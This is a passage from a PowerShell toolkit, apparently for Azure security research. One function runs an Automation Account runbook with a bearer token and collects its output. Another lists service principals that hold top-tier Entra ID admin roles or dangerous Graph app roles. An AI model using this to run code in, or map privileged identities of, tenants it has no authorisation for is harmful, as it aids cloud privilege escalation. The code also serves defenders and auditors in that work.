    .DESCRIPTION
        Run an existing Automation Account runbook and retrieve its output

    .PARAMETER Token
        The AzureRM-scoped JWT for the test principal

    .PARAMETER RunBookName
        The name of the runbook you want to run

    .PARAMETER AutomationAccountPath
        TThe full URL path to the Automation Account

    .EXAMPLE
        C:\PS> Get-AzureAutomationAccountRunBookOutput `
            -Token $ARMToken `
            -RunBookName "MyCoolRunBook" `
            -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount"

        Description
        -----------
        Publish a new runbook to an existing automation account called "MyCoolAutomationAccount"

    .LINK
        https://medium.com/p/74aee1006f48
        https://docs.microsoft.com/en-us/azure/role-based-access-control/role-assignments-rest
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $AutomationAccountPath,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $RunBookName
    )
    
    Try {
        $GUID = New-GUID
        $Body = @{
            requests = @(
                @{
                    content = @{
                        properties = @{
                            parameters = @{
                                }
                        runbook = @{
                            name = $RunBookName
                        }
                        runOn = ""
                        }
                    }
                    httpMethod = "PUT"
                    name = (New-GUID).GUID
                    requestHeaderDetails = @{
                        commandName = "Microsoft_Azure_Automation."
                    }
                    url = "$($AutomationAccountPath)/jobs/$($GUID)?api-version=2017-05-15-preview"
                }
            )
        }
        $Request = Invoke-WebRequest -UseBasicParsing -Uri "https://management.azure.com/batch?api-version=2020-06-01" `
        -Method "POST" `
        -WebSession $session `
        -Headers @{
          "Authorization"="Bearer $($Token)"
        } `
        -ContentType "application/json" `
        -Body $($Body | ConvertTo-JSON -Depth 5)
        
        $RefreshAttempts = 0
        Do {
          $RunBookJobOutput = Invoke-RestMethod `
            -Uri "$($AutomationAccountPath)/jobs/$($GUID)/output?api-version=2017-05-15-preview&_=1663548574053" `
            -Method GET `
            -Headers @{Authorization = "Bearer $($Token)"}
          $RefreshAttempts++
          Start-Sleep -s 6
        } Until (
            $RunBookJobOutput.Length -GT 0 -Or $RefreshAttempts -GT 10
        )
        
        $RunBookJobOutput

    }
    Catch {
        $_
    }
}

Function Get-TierZeroServicePrincipals {
    <#
    .SYNOPSIS
        Finds all Service Principals that have a Tier Zero AzureAD Admin Role or Tier Zero MS Graph App Role assignment
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Finds all Service Principals that have a Tier Zero AzureAD Admin Role or Tier Zero MS Graph App Role assignment
    
    .PARAMETER Token
        A MS Graph scoped JWT for a user with the ability to read AzureAD and MS Graph app role assignments
    
    .EXAMPLE
    C:\PS> Get-TierZeroServicePrincipals -Token $Token
    
    Description
    -----------
    Retrieve a list of all service principals with Tier Zero privileges
    
    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
    )

    # Get Global Admin service principals:
    $GlobalAdmins = $null 
    $URI = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?`$filter=roleDefinitionId eq '62e90394-69f5-4237-9190-012177145e10'&`$expand=principal"
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $GlobalAdmins += $Results.value
        } else {
            $GlobalAdmins += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))
    
    # Get Privileged Role Administrator principals:
    $PrivRoleAdmins = $null
    $URI = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?`$filter=roleDefinitionId eq 'e8611ab8-c189-46e8-94e1-60213ab1f814'&`$expand=principal"
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $PrivRoleAdmins += $Results.value
        } else {
            $PrivRoleAdmins += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))
    
    # Get Privileged Authentication Administrator principals:
    $PrivAuthAdmins = $null
    $URI = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?`$filter=roleDefinitionId eq '7be44c8a-adaf-4e2a-84d6-ab2649e08a13'&`$expand=principal"
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $PrivAuthAdmins += $Results.value
        } else {
            $PrivAuthAdmins += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))
    
    # Get Partner Tier2 Support principals:
    $PartnerTier2Support = $null
    $URI = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?`$filter=roleDefinitionId eq 'e00e864a-17c5-4a4b-9c06-f5b95a8d5bd8'&`$expand=principal"
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $PartnerTier2Support += $Results.value
        } else {
            $PartnerTier2Support += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))
    
    # Get the MS Graph SP
    $URL = "https://graph.microsoft.com/v1.0/servicePrincipals/?`$filter=appId eq '00000003-0000-0000-c000-000000000000'"
    $MSGraphSP = (Invoke-RestMethod `
        -URI $URL `
        -Method "GET" `
        -Headers @{
            Authorization = "Bearer $($Token)"
        }).value
    
    # Get app roles scoped to the Graph SP
    $MGAppRoles = $null
    $URI = "https://graph.microsoft.com/v1.0/servicePrincipals/$($MSGraphSP.id)/appRoleAssignedTo"
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $MGAppRoles += $Results.value
        } else {
            $MGAppRoles += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))
    
    $TierZeroServicePrincipals = @()
    
    $GlobalAdmins | select -expand principal | ?{$_.'@odata.type' -Like "#microsoft.graph.servicePrincipal"} | %{
        $TierZeroServicePrincipal = New-Object PSObject -Property @{
            ServicePrincipalID    = $_.id
            TierZeroPrivilege     = "Global Administrator"
        }
        $TierZeroServicePrincipals += $TierZeroServicePrincipal
    }
    
    $PrivRoleAdmins | select -expand principal | ?{$_.'@odata.type' -Like "#microsoft.graph.servicePrincipal"} | %{
        $TierZeroServicePrincipal = New-Object PSObject -Property @{
            ServicePrincipalID    = $_.id
            TierZeroPrivilege     = "Privileged Role Administrator"
        }
        $TierZeroServicePrincipals += $TierZeroServicePrincipal
    }
    
    $PrivAuthAdmins | select -expand principal | ?{$_.'@odata.type' -Like "#microsoft.graph.servicePrincipal"} | %{
        $TierZeroServicePrincipal = New-Object PSObject -Property @{
            ServicePrincipalID    = $_.id
            TierZeroPrivilege     = "Privileged Authentication Administrator"
        }
        $TierZeroServicePrincipals += $TierZeroServicePrincipal
    }
    
    $PartnerTier2Support | select -expand principal | ?{$_.'@odata.type' -Like "#microsoft.graph.servicePrincipal"} | %{
        $TierZeroServicePrincipal = New-Object PSObject -Property @{
            ServicePrincipalID    = $_.id
            TierZeroPrivilege     = "Partner Tier2 Support"
        }
        $TierZeroServicePrincipals += $TierZeroServicePrincipal
    }
    
    $MGAppRoles | ?{$_.appRoleId -Like "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" -And $_.principalType -Like "ServicePrincipal"} | %{
        $TierZeroServicePrincipal = New-Object PSObject -Property @{
            ServicePrincipalID    = $_.principalId
            TierZeroPrivilege     = "MS Graph App Role: RoleManagement.ReadWrite.Directory"
        }
        $TierZeroServicePrincipals += $TierZeroServicePrincipal
    }
    
    $MGAppRoles | ?{$_.appRoleId -Like "06b708a9-e830-4db3-a914-8e69da51d44f" -And $_.principalType -Like "ServicePrincipal"} | %{
        $TierZeroServicePrincipal = New-Object PSObject -Property @{
            ServicePrincipalID    = $_.principalId
            TierZeroPrivilege     = "MS Graph App Role: AppRoleAssignment.ReadWrite.All"
        }
        $TierZeroServicePrincipals += $TierZeroServicePrincipal
    }
    
    $TierZeroServicePrincipals
}
